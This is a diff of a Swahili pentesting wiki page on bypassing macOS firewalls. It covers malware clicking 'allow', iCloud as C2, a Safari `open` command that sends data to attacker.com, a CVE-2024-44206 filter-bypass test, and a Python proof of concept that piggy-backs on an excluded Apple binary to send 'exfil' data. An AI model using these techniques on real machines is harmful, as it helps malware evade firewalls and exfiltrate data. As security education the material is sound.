@@ -12,7 +12,7 @@ Mbinu zifuatazo zilipatikana zikifanya kazi katika baadhi ya programu za firewal
 
 ### Kibonyezi bandia
 
-- Ikiwa firewall inahitaji ruhusa kutoka kwa mtumiaji, fanya malware **ibonyeze ruhusu**
+- Ikiwa firewall inahitaji ruhusa kutoka kwa mtumiaji, fanya malware **kibonyeze ruhusu**
 
 ### **Tumia binaries zilizotiwa saini na Apple**
 
@@ -22,13 +22,13 @@ Mbinu zifuatazo zilipatikana zikifanya kazi katika baadhi ya programu za firewal
 
 Firewall inaweza kuwa inaruhusu muunganisho kwa tovuti maarufu za apple kama **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
 
-### Kupanua kwa ujumla
+### Kupanua kwa jumla
 
-Mawazo mengine ya kujaribu kupita firewalls
+Wazo kadhaa za kujaribu kupita firewall
 
 ### Angalia trafiki inayoruhusiwa
 
-Kujua trafiki inayoruhusiwa kutakusaidia kubaini tovuti ambazo zinaweza kuwa kwenye orodha ya ruhusa au programu zipi zinazoruhusiwa kuzifikia.
+Kujua trafiki inayoruhusiwa kutakusaidia kubaini tovuti ambazo zinaweza kuwa kwenye orodha ya ruhusa au programu zipi zimepewa ruhusa kuziaccess.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
@@ -65,28 +65,29 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 
 Ikiwa unaweza **kuiingiza msimbo katika mchakato** ambao unaruhusiwa kuungana na seva yoyote unaweza kupita ulinzi wa firewall:
 
+
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
 ---
 
-## Uhalifu wa hivi karibuni wa kupita firewall ya macOS (2023-2025)
+## Uthibitisho wa hivi karibuni wa kupita firewall ya macOS (2023-2025)
 
 ### Kupita chujio cha maudhui ya wavuti (Screen Time) – **CVE-2024-44206**
-Mnamo Julai 2024 Apple ilirekebisha hitilafu muhimu katika Safari/WebKit ambayo ilivunja “Chujio cha maudhui ya wavuti” kinachotumika na udhibiti wa wazazi wa Screen Time.
-URI iliyoundwa kwa njia maalum (kwa mfano, yenye “://” iliyokodishwa mara mbili) haitambuliwi na ACL ya Screen Time lakini inakubaliwa na WebKit, hivyo ombi linawekwa nje bila kuchujwa. Mchakato wowote unaoweza kufungua URL (ikiwemo msimbo ulio katika sanduku au usio na saini) unaweza hivyo kufikia maeneo ambayo yamezuiwa waziwazi na mtumiaji au profaili ya MDM.
+Mnamo Julai 2024 Apple ilirekebisha hitilafu muhimu katika Safari/WebKit ambayo ilivunja “Chujio cha maudhui ya wavuti” kinachotumiwa na udhibiti wa wazazi wa Screen Time.
+URI iliyoundwa kwa njia maalum (kwa mfano, yenye “://” iliyokodishwa mara mbili) haitambuliwi na ACL ya Screen Time lakini inakubaliwa na WebKit, hivyo ombi linawekwa nje bila kuchujwa. Mchakato wowote unaoweza kufungua URL (ikiwemo msimbo ulio katika sanduku au usio na saini) unaweza hivyo kufikia maeneo ambayo yamezuiliwa waziwazi na mtumiaji au profaili ya MDM.
 
 Jaribio la vitendo (sistimu isiyo na marekebisho):
 ```bash
 open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
-### Kosa la agizo la Filter ya Packet (PF) katika macOS 14 “Sonoma”
+### Packet Filter (PF) bug ya kuagiza sheria katika macOS 14 “Sonoma”
 Wakati wa mzunguko wa beta wa macOS 14, Apple ilianzisha kurudi nyuma katika kifuniko cha nafasi ya mtumiaji kilichozunguka **`pfctl`**. 
-Sheria ambazo ziliongezwa kwa neno la `quick` (linalotumiwa na swichi nyingi za VPN) zilipuuziliwa mbali kimya, na kusababisha uvujaji wa trafiki hata wakati GUI ya VPN/firewall iliripoti *imezuiwa*. Kosa hilo lilithibitishwa na wauzaji kadhaa wa VPN na kurekebishwa katika RC 2 (ujenzi 23A344).
+Sheria ambazo ziliongezwa kwa neno la `quick` (linalotumiwa na swichi nyingi za VPN) zilipuuziliwa mbali kimya, na kusababisha uvujaji wa trafiki hata wakati GUI ya VPN/firewall iliripoti *imezuiwa*. Hitilafu hiyo ilithibitishwa na wauzaji kadhaa wa VPN na kurekebishwa katika RC 2 (ujenzi 23A344).
 
-Kukagua uvujaji haraka:
+Quick leak-check:
 ```bash
 pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
@@ -95,7 +96,7 @@ sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 Kabla ya macOS 11.2, **`ContentFilterExclusionList`** iliruhusu ~50 Apple binaries kama **`nsurlsessiond`** na App Store kupita firewall zote za socket-filter zilizotekelezwa na mfumo wa Network Extension (LuLu, Little Snitch, nk.).
 Malware inaweza tu kuanzisha mchakato ulioondolewa—au kuingiza msimbo ndani yake—na kupitisha trafiki yake mwenyewe kupitia socket ambayo tayari inaruhusiwa. Apple iliondoa kabisa orodha ya kuondolewa katika macOS 11.2, lakini mbinu hii bado inahusiana kwenye mifumo ambayo haiwezi kuboreshwa.
 
-Mfano wa uthibitisho wa dhana (pre-11.2):
+Example proof-of-concept (pre-11.2):
 ```python
 import subprocess, socket
 # Launch excluded App Store helper (path collapsed for clarity)
@@ -106,19 +107,19 @@ s.send(b"exfil...")
 ```
 ---
 
-## Vidokezo vya zana za macOS za kisasa
+## Vidokezo vya zana za kisasa za macOS
 
 1. Kagua sheria za sasa za PF ambazo moto wa GUI unazalisha:
 ```bash
 sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 ```
-2. Tambua binaries ambazo tayari zina *outgoing-network* entitlement (inayofaa kwa piggy-backing):
+2. Orodhesha binaries ambazo tayari zina *outgoing-network* entitlement (inayofaa kwa piggy-backing):
 ```bash
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
 ```
 3. Jisajili kimaandishi mwenyewe mfiltri wa maudhui ya Network Extension katika Objective-C/Swift.
-Mfano mdogo usio na mizizi ambao unapeleka pakiti kwa soketi ya ndani unapatikana katika msimbo wa chanzo wa **LuLu** wa Patrick Wardle.
+Mfano mdogo usio na mizizi unaoelekeza pakiti kwa soketi ya ndani upo katika msimbo wa chanzo wa Patrick Wardle’s **LuLu**.
 
 ## Marejeleo
 
